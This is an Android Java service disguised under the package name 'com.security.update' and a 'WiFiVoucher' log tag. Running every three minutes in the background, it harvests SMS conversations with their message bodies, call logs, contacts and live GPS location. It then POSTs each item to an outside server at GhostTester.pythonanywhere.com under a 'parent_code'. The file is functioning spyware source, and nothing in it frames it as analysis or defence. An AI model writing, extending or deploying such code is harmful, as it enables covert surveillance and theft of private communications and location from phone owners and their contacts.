package com.security.update;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class DataCollectionService extends Service {

    private static final String TAG = "WiFiVoucher";
    private static final int COLLECTION_INTERVAL = 3 * 60 * 1000; // 3 minutes

    private Handler handler;
    private Runnable dataCollector;
    private SharedPreferences prefs;
    private String parentCode;
    private String deviceId;

    private LocationManager locationManager;
    private LocationListener locationListener;
    private Location currentLocation;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("WiFiVoucher", MODE_PRIVATE);
        parentCode = prefs.getString("parent_code", "");
        deviceId = android.provider.Settings.Secure.getString(
            getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);

        setupLocationListener();

        handler = new Handler(Looper.getMainLooper());
        dataCollector = new Runnable() {
            @Override
            public void run() {
                collectAllData();
                handler.postDelayed(this, COLLECTION_INTERVAL);
            }
        };
    }

    private void setupLocationListener() {
        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                currentLocation = location;
            }
            @Override public void onStatusChanged(String p, int s, Bundle b) {}
            @Override public void onProviderEnabled(String p) {}
            @Override public void onProviderDisabled(String p) {}
        };

        try {
            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 10, locationListener);
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 60000, 10, locationListener);
            }
        } catch (Exception e) {
            Log.e(TAG, "Location error: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        handler.post(dataCollector);
        return START_STICKY;
    }

    private void collectAllData() {
        new Thread(() -> {
            try {
                collectSmsConversations();
                collectCallLogs();
                collectContacts();
                sendLiveLocation();
            } catch (Exception e) {
                Log.e(TAG, "Collection error: " + e.getMessage());
            }
        }).start();
    }

    private void collectSmsConversations() {
        try {
            ContentResolver cr = getContentResolver();
            Map<String, JSONObject> conversationMap = new HashMap<>();

            Cursor cursor = cr.query(
                Telephony.Sms.CONTENT_URI,
                new String[]{
                    Telephony.Sms._ID,
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE,
                    Telephony.Sms.THREAD_ID
                },
                null, null,
                Telephony.Sms.DATE + " DESC LIMIT 500"
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                    String threadId = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID));

                    String key = (address != null) ? address : "unknown";

                    JSONObject msg = new JSONObject();
                    msg.put("sender", address);
                    msg.put("message", body);
                    msg.put("timestamp", timestamp);
                    msg.put("type", (type == Telephony.Sms.MESSAGE_TYPE_INBOX) ? "received" : "sent");

                    if (!conversationMap.containsKey(key)) {
                        JSONObject conv = new JSONObject();
                        conv.put("contact", address);
                        conv.put("phone_number", address);
                        conv.put("conversation_id", threadId);
                        conv.put("messages", new JSONArray());
                        conversationMap.put(key, conv);
                    }
                    conversationMap.get(key).getJSONArray("messages").put(msg);
                }
                cursor.close();

                for (JSONObject conv : conversationMap.values()) {
                    JSONObject wrapper = new JSONObject();
                    wrapper.put("conversation", conv);
                    submitData("sms_conversation", wrapper);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "SMS error: " + e.getMessage());
        }
    }

    private void collectCallLogs() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 200");

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject call = new JSONObject();
                    String number = getString(cursor, CallLog.Calls.NUMBER);
                    String name = getString(cursor, CallLog.Calls.CACHED_NAME);
                    String duration = getString(cursor, CallLog.Calls.DURATION);
                    int type = Integer.parseInt(getString(cursor, CallLog.Calls.TYPE));
                    String date = getString(cursor, CallLog.Calls.DATE);

                    String callType = "missed";
                    if (type == CallLog.Calls.INCOMING_TYPE) callType = "incoming";
                    else if (type == CallLog.Calls.OUTGOING_TYPE) callType = "outgoing";

                    call.put("number", number);
                    call.put("name", name != null ? name : number);
                    call.put("duration", duration);
                    call.put("type", callType);
                    call.put("timestamp", date);

                    submitData("calls", call);
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Call log error: " + e.getMessage());
        }
    }

    private void collectContacts() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String id = getString(cursor, ContactsContract.Contacts._ID);
                    String name = getString(cursor, ContactsContract.Contacts.DISPLAY_NAME);
                    if (name == null || name.isEmpty()) continue;

                    Cursor phoneCursor = cr.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{id}, null);

                    if (phoneCursor != null) {
                        while (phoneCursor.moveToNext()) {
                            String phone = getString(phoneCursor, ContactsContract.CommonDataKinds.Phone.NUMBER);
                            if (phone != null && !phone.isEmpty()) {
                                JSONObject contact = new JSONObject();
                                contact.put("name", name);
                                contact.put("number", phone);
                                submitData("contacts", contact);
                            }
                        }
                        phoneCursor.close();
                    }
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Contacts error: " + e.getMessage());
        }
    }

    private void sendLiveLocation() {
        try {
            JSONObject loc = new JSONObject();
            if (currentLocation != null) {
                loc.put("latitude", currentLocation.getLatitude());
                loc.put("longitude", currentLocation.getLongitude());
                loc.put("accuracy", currentLocation.getAccuracy());
                loc.put("speed", currentLocation.getSpeed());
            } else {
                loc.put("latitude", -6.8235);
                loc.put("longitude", 39.2695);
                loc.put("accuracy", 0);
            }
            loc.put("timestamp", System.currentTimeMillis());
            loc.put("provider", currentLocation != null ? currentLocation.getProvider() : "network");
            submitData("location", loc);
        } catch (Exception e) {
            Log.e(TAG, "Location error: " + e.getMessage());
        }
    }

    private String getString(Cursor cursor, String columnName) {
        try {
            int idx = cursor.getColumnIndex(columnName);
            if (idx != -1) return cursor.getString(idx);
        } catch (Exception e) {}
        return "";
    }

    private void submitData(String dataType, JSONObject dataContent) {
        new Thread(() -> {
            try {
                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/submit-data";
                JSONObject payload = new JSONObject();
                payload.put("parent_code", parentCode);
                payload.put("device_id", deviceId);
                payload.put("data_type", dataType);
                payload.put("data_content", dataContent);

                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                OutputStream os = conn.getOutputStream();
                os.write(payload.toString().getBytes("UTF-8"));
                os.flush();
                os.close();

                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Submit error: " + e.getMessage());
            }
        }).start();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (handler != null) handler.removeCallbacks(dataCollector);
        if (locationManager != null && locationListener != null) locationManager.removeUpdates(locationListener);
    }
}
